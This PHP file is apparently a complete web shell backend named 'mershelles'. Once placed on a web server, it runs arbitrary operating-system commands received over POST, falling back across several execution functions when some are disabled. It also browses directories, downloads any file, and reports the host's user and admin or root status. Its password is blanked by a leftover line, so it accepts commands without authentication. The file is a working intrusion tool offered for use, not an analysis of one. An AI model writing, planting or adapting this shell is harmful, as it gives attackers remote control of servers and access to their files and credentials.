<?php

#region password
$password = "@@PASSWORD@@";
$password = ""; // todo remove
if ($password === "@@PASS" . "WORD@@") {
    $password = "";
}
define("PASSWORD", $password);
#endregion

#region responses
function respond($code, $data)
{
    $data = array_merge(array("cwd" => getcwd()), $data);
    $delimiter = $_POST["delimiter"];
    $start = "MERSHELLES_START_" . $delimiter;
    $end = "MERSHELLES_END_" . $delimiter;
    http_response_code($code);
    echo $start . base64_encode(json_encode($data)) . $end;
    die();
}

function error($message)
{
    respond(400, array("error" => $message));
}

function success($data)
{
    respond(200, array_merge(array("success" => true), $data));
}
#endregion

function checkAuth()
{
    if (PASSWORD === "") {
        return; // no auth needed
    }

    if ($_POST["password"] !== PASSWORD) {
        respond(401, array("error" => "Invalid password"));
    }
}

function handleAuth()
{
    if ($_POST["password"] === PASSWORD) {
        setcookie("mershelles", md5(PASSWORD), time() + (86400 * 30));
        success(array());
    } else {
        error("Invalid password!");
    }
}

# check authentication
if (PASSWORD !== "" && $_COOKIE["mershelles"] !== md5(PASSWORD)) {

    # if is auth request, check password
    if ($_SERVER["REQUEST_METHOD"] === "POST" && $_POST["type"] === "auth") {
        handleAuth();
    }

    respond(401, array("error" => "unauthorized"));
}

#region api calls

function exec_cmd($cmd)
{
    try {
        if (function_exists("exec")) {
            exec($cmd, $output);
            $output = implode("\n", $output);
        } else if (function_exists("shell_exec")) {
            $output = shell_exec($cmd);
        } else if (function_exists("system")) {
            ob_start();
            system($cmd);
            $output = ob_get_contents();
            ob_end_clean();
        } else if (function_exists("passthru")) {
            ob_start();
            passthru($cmd);
            $output = ob_get_contents();
            ob_end_clean();
        } else {
            error("Command execution not possible, all functions disabled.");
            return null;
        }
    } catch (Exception $e) {
        return null;
    }

    return $output;
}

function handleExec()
{
    $cmd = $_POST["command"];

    if (substr($cmd, 0, 2) === "cd") {
        $dir = trim(substr($cmd, 2));
        if (is_dir($dir)) {
            chdir($dir);
            success(array("output" => ""));
        } else {
            error("Directory does not exist!");
        }
    }

    $output = exec_cmd($cmd);
    success(array("output" => $output));
}

function handleInit()
{

    function windows_summary()
    {
        $is_admin_check = "net session 1>NUL 2>NUL || echo false";
        $is_admin_res = exec_cmd($is_admin_check);

        return array(
            "username" => exec_cmd("whoami"),
            "isSuperUser" => $is_admin_res[0] !== "false"
        );
    }

    function linux_summary()
    {
        $is_root_res = exec_cmd("whoami");
        return array(
            "username" => $is_root_res,
            "isSuperUser" => $is_root_res[0] === "root"
        );
    }

    function is_windows()
    {
        return strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
    }

    $res = array(
        "os" => php_uname("s"),
        "hostname" => php_uname("n"),
        "release" => php_uname("r"),
        "version" => php_uname("v"),
        "machine" => php_uname("m"),
        "all" => php_uname("a"),
        "writeable" => is_writeable(getcwd())
    );

    if (is_windows()) {
        $res = array_merge($res, windows_summary());
    } else {
        $res = array_merge($res, linux_summary());
    }

    success($res);
}

function handleLs()
{
    $files = array();
    $dir = opendir(getcwd());
    while ($file = readdir($dir)) {
        /* get name, type, size, last modified, mode */

        if ($file === ".") {
            continue;
        }

        $type = filetype($file);
        $isDir = $type === "dir";
        $size = $isDir ? 0 : filesize($file);
        $lastModified = filemtime($file);
        $mode = substr(sprintf('%o', fileperms($file)), -4);
        $files[] = array(
            "name" => $file,
            "isDir" => $isDir,
            "size" => $size,
            "lastModified" => $lastModified,
            "mode" => $mode
        );
    }
    closedir($dir);
    success(array("files" => $files));
}

function handleDownload()
{
    $file = $_POST["path"];
    if (!file_exists($file)) {
        die('File not found');
    }

    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    // todo set correct name
    header('Content-Disposition: attachment; filename="' . basename($file) . '"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    flush();
    readfile($file);
    flush();
    exit;
    exit(0);
}

// handle api calls
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $type = $_POST["type"];

    if (isset($_POST["cwd"]) && is_dir($_POST["cwd"])) {
        chdir($_POST["cwd"]);
    }


    switch ($type) {
        case "init":
            handleInit();
            break;
        case "exec":
            handleExec();
            break;
        case "ls":
            handleLs();
            break;
        case "download":
            handleDownload();
            break;
        default:
            break;
    }
}

#endregion